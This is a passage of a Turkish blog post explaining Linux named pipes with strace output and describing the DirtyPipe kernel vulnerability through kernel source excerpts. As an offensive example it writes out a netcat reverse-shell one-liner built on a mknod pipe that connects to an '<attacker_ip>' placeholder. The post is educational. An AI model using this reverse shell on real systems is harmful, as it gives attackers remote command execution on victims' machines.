+<span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">tail</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"> </span>
+<span class="n">imam</span><span class="w"> </span><span class="n">hatipler</span><span class="w"> </span><span class="n">kapatilsin</span><span class="w"></span>
+</code></pre></div>
+
+<p>Dikkat</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">ka1</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~</span><span class="p">]</span><span class="w"></span>
+<span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">temp</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>
+<span class="nl">zsh</span><span class="p">:</span><span class="w"> </span><span class="n">permission</span><span class="w"> </span><span class="n">denied</span><span class="o">:</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>
+</code></pre></div>
+
+<p>Ayrıca 2. bir dikkat etmemiz gereken şey ise tıpkı isimsiz pipeler gibi (neden belirtme gereği duyuyorum bilmiyorum ama, yani sonuçta pipe isimli de olsa isimsiz de olsa pipedır.) eğer okuma yapmazsanız üzerine 2. bir veriyi yazamazsınız. Bu sebeple çift yönlü bir işlem yapmanız gerekir. Yok öyle abi her şeyi buraya atayım sonra okuyayım. Zaten öyle bir isteğiniz varsa pipe kullanmanıza gerek yok gidin dosya kullanın. </p>
+<p>Şimdi bir de isimli boruları kullanırken yaptığımız yönlendirme işlemindeki kullanılan sistem çağrılarına bakalım:</p>
+<div class="highlight"><pre><span></span><code><span class="n">strace</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">sh</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">temp</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="w"></span>
+<span class="nl">sh</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="o">:</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="n">open</span><span class="w"> </span><span class="n">cat</span><span class="o">:</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">file</span><span class="w"></span>
+<span class="o">%</span><span class="w"> </span><span class="n">time</span><span class="w">     </span><span class="n">seconds</span><span class="w">  </span><span class="n">usecs</span><span class="o">/</span><span class="n">call</span><span class="w">     </span><span class="n">calls</span><span class="w">    </span><span class="n">errors</span><span class="w"> </span><span class="n">syscall</span><span class="w"></span>
+<span class="o">------</span><span class="w"> </span><span class="o">-----------</span><span class="w"> </span><span class="o">-----------</span><span class="w"> </span><span class="o">---------</span><span class="w"> </span><span class="o">---------</span><span class="w"> </span><span class="o">----------------</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">         </span><span class="mi">1</span><span class="w"> </span><span class="n">faccessat</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">3</span><span class="w">         </span><span class="mi">1</span><span class="w"> </span><span class="n">openat</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">2</span><span class="w">           </span><span class="n">close</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">read</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">3</span><span class="w">           </span><span class="n">write</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">4</span><span class="w">           </span><span class="n">newfstatat</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">set_tid_address</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">set_robust_list</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">rt_sigaction</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">getpid</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">getppid</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">getuid</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">geteuid</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">getgid</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">3</span><span class="w">           </span><span class="n">brk</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">3</span><span class="w">           </span><span class="n">munmap</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">execve</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">6</span><span class="w">           </span><span class="n">mmap</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">4</span><span class="w">           </span><span class="n">mprotect</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">prlimit64</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">getrandom</span><span class="w"></span>
+<span class="w">  </span><span class="mf">0.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">         </span><span class="mi">1</span><span class="w">           </span><span class="n">rseq</span><span class="w"></span>
+<span class="o">------</span><span class="w"> </span><span class="o">-----------</span><span class="w"> </span><span class="o">-----------</span><span class="w"> </span><span class="o">---------</span><span class="w"> </span><span class="o">---------</span><span class="w"> </span><span class="o">----------------</span><span class="w"></span>
+<span class="mf">100.00</span><span class="w">    </span><span class="mf">0.000000</span><span class="w">           </span><span class="mi">0</span><span class="w">        </span><span class="mi">42</span><span class="w">         </span><span class="mi">2</span><span class="w"> </span><span class="n">total</span><span class="w"></span>
+</code></pre></div>
+
+<p>Normal strace çıktısına bakalım:</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──</span><span class="p">(</span><span class="n">root</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">ka1</span><span class="p">]</span><span class="w"></span>
+<span class="err">└─#</span><span class="w"> </span><span class="n">strace</span><span class="w"> </span><span class="o">-</span><span class="n">qf</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">execve</span><span class="p">,</span><span class="n">pipe</span><span class="p">,</span><span class="n">write</span><span class="p">,</span><span class="n">read</span><span class="w"> </span>\
+<span class="n">sh</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">&#39;</span><span class="n">cat</span><span class="w"> </span><span class="n">temp</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ebucehil</span><span class="err">&#39;</span><span class="w"></span>
+<span class="n">execve</span><span class="p">(</span><span class="s">&quot;/usr/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;cat temp.txt &gt; /tmp/ebucehil&quot;</span><span class="p">],</span><span class="w"> </span><span class="mh">0xffffd50935b8</span><span class="w"> </span><span class="cm">/* 32 vars */</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\177</span><span class="s">ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0</span><span class="s">py</span><span class="se">\2\0\0\0\0\0</span><span class="s">&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">832</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">832</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/usr/bin/cat&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;cat&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;temp.txt&quot;</span><span class="p">],</span><span class="w"> </span><span class="mh">0xaaaacda2fa88</span><span class="w"> </span><span class="cm">/* 32 vars */</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\177</span><span class="s">ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0</span><span class="s">py</span><span class="se">\2\0\0\0\0\0</span><span class="s">&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">832</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">832</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;imam hatipler kapatilsin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">131072</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">25</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;imam hatipler kapatilsin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">25</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">25</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">131072</span><span class="p">)</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">530925</span><span class="p">]</span><span class="w"> </span><span class="o">+++</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">+++</span><span class="w"></span>
+<span class="o">---</span><span class="w"> </span><span class="n">SIGCHLD</span><span class="w"> </span><span class="p">{</span><span class="n">si_signo</span><span class="o">=</span><span class="n">SIGCHLD</span><span class="p">,</span><span class="w"> </span><span class="n">si_code</span><span class="o">=</span><span class="n">CLD_EXITED</span><span class="p">,</span><span class="w"> </span><span class="n">si_pid</span><span class="o">=</span><span class="mi">530925</span><span class="p">,</span><span class="w"> </span><span class="n">si_uid</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_status</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_utime</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_stime</span><span class="o">=</span><span class="mi">0</span><span class="p">}</span><span class="w"> </span><span class="o">---</span><span class="w"></span>
+<span class="o">+++</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">+++</span><span class="w"></span>
+</code></pre></div>
+
+<p>Yapılan sistem çağrılarına baktığımızda (en azından filtrelediklerimize) isimli boruların daha cimri olduğunu görebiliriz. </p>
+<p>DirtyPipe açığına geçmeden önce offensive kullanım örneği vermek amacıyla isimli borularla ilgili dokunmak istediğim bir şey var. Mknod/Mkfifo kullanarak reverse shell oluşturabileceğinizi ve kullanabileceğiniz biliyor muydunuz?</p>
+<div class="highlight"><pre><span></span><code><span class="n">mknod</span><span class="w"> </span><span class="n">backpipe</span><span class="w"> </span><span class="n">p</span><span class="p">;</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">attacker_ip</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">port</span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="o">&lt;</span><span class="n">backpipe</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"> </span><span class="mi">1</span><span class="o">&gt;</span><span class="n">backpipe</span><span class="w"></span>
+</code></pre></div>
+
+<p>2-3 belki daha önce(telegram historyden baktım 2017’ymiş) ilgili komutu gördüğümde gerçekten mindfuck geçirmiştim fakat şimdi pipeları biraz da olsun öğrendiğim için neden olmasın ki diyebiliyorum. </p>
+<p>Daha detaylı bilgi için:</p>
+<p><a href="https://shadowslayerqwerty.medium.com/creating-a-netcat-reverse-shell-without-e-89b45134de99">https://shadowslayerqwerty.medium.com/creating-a-netcat-reverse-shell-without-e-89b45134de99</a></p>
+<h2>DirtyPipe</h2>
+<p>Direkt detaylı bilgi: <a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com/</a></p>
+<p>Kısaca: 2006 yılında Linux üzerinde splice diye bir sistem çağrısı entegre edilmiş. İlgili sistem çağrısı borular arasındaki iletişimde tüm datanın kernel’a gidip tekrardan userland’e geri dönmemesi için verimlilik adına kullanılmak amacıyla ortaya çıkmış tabi. Bunu da borular arasındaki buffera alınan veriler içerisine “<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>” bayrağı ile sağlamışlar. Buraya kadar her şey düzgün giderken buffer’a eklenen her veri içerisine bu değer işlenmiş fakat ilgili refactoring düzgün işletilmediği veya kaçırıldığı için ilgili bayrak, splice operasyonu sırasında initialize edilmediği için saldırgan kişiler initialize sırasında istediği değerleri read-only buffer içerisine yazabilmişler. Sonrası malum zaten.</p>
+<p>Kısacasından ziyade açıklamaya girersek eğer:</p>
+<p>Borularda yazma işlemini gerçekleştiren <strong>pipe_write()</strong> fonksiyonu gerçekleştiriyor. Eğer boru boş değilse son buffer içerisindeki veri ile şu an ki veriyi birleştirmekle yükümlü. Bunu da pek tabi bayrak ile yapıyor. Bunu yaparken de verileri farklı bufferlarda tutabilmek için aslında 2 adet dallanma gerçekleştiriyor. Yazma işlemi yapacağı zaman yeni oluşturulan buffer’ı “<strong>PIPE_BUF_FLAG_CAN_MERGE</strong>” olarak işaretliyor ki gelen veriler birleştirilebilsin. Veri akışı bitene kadar da bu bayrak kullanılıyor.  Yeni oluşturulan buffer da doğal olarak memory table’da belirli bir allocation işlemi gerçekleştiriyor. </p>
+<div class="highlight"><pre><span></span><code><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">head</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">];</span><span class="w"> </span>
+<span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">page</span><span class="p">;</span><span class="w"></span>
+<span class="n">buf</span><span class="o">-&gt;</span><span class="n">ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">anon_pipe_buf_ops</span><span class="p">;</span><span class="w"></span>
+<span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_packetized</span><span class="p">(</span><span class="n">filp</span><span class="p">))</span><span class="w"></span>
+<span class="w">  </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PIPE_BUF_FLAG_PACKET</span><span class="p">;</span><span class="w"></span>
+<span class="w"> </span><span class="k">else</span><span class="w"></span>
+<span class="w">   </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">PIPE_BUF_FLAG_CAN_MERGE</span><span class="p">;</span><span class="w"> </span>
+<span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tmp_page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"> </span>
+<span class="w"> </span><span class="o">**</span><span class="n">copied</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">copy_page_from_iter</span><span class="p">(</span><span class="n">page</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_SIZE</span><span class="p">,</span><span class="w"> </span><span class="n">from</span><span class="p">);</span><span class="o">**</span><span class="w"></span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">                </span><span class="n">pipe_buf_release</span><span class="p">(</span><span class="n">pipe</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span><span class="w"></span>
+<span class="w">                </span><span class="n">spin_lock_irq</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span><span class="w"></span>
+<span class="w">                </span><span class="n">tail</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
+<span class="w">                </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tail</span><span class="p">;</span><span class="w"></span>
+<span class="w">                </span><span class="n">spin_unlock_irq</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span><span class="w"></span>
+<span class="w">            </span><span class="p">}</span><span class="w"></span>
+<span class="w">            </span><span class="n">total_len</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">chars</span><span class="p">;</span><span class="w"></span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">total_len</span><span class="p">)</span><span class="w"></span>
+<span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">  </span><span class="cm">/* common path: read succeeded */</span><span class="w"></span>
+<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">pipe_empty</span><span class="p">(</span><span class="n">head</span><span class="p">,</span><span class="w"> </span><span class="n">tail</span><span class="p">))</span><span class="w">    </span><span class="cm">/* More to do? */</span><span class="w"></span>
+<span class="w">                </span><span class="k">continue</span><span class="p">;</span><span class="w"></span>
+</code></pre></div>
+
+<p>copy_page_from_iter: </p>
+<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="nf">copy_page_to_iter_pipe</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">page</span><span class="w"> </span><span class="o">*</span><span class="n">page</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">bytes</span><span class="p">,</span><span class="w"></span>
+<span class="w">             </span><span class="k">struct</span><span class="w"> </span><span class="nc">iov_iter</span><span class="w"> </span><span class="o">*</span><span class="n">i</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_inode_info</span><span class="w"> </span><span class="o">*</span><span class="n">pipe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">pipe</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_buffer</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">p_tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">p_mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">ring_size</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">off</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">bytes</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">bytes</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">sanity</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">i_head</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">p_mask</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">off</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">page</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="cm">/* merge with the last one */</span><span class="w"></span>
+<span class="w">            </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">            </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="n">i_head</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">i_head</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">p_mask</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pipe_full</span><span class="p">(</span><span class="n">i_head</span><span class="p">,</span><span class="w"> </span><span class="n">p_tail</span><span class="p">,</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">page_cache_pipe_buf_ops</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">get_page</span><span class="p">(</span><span class="n">page</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">page</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+
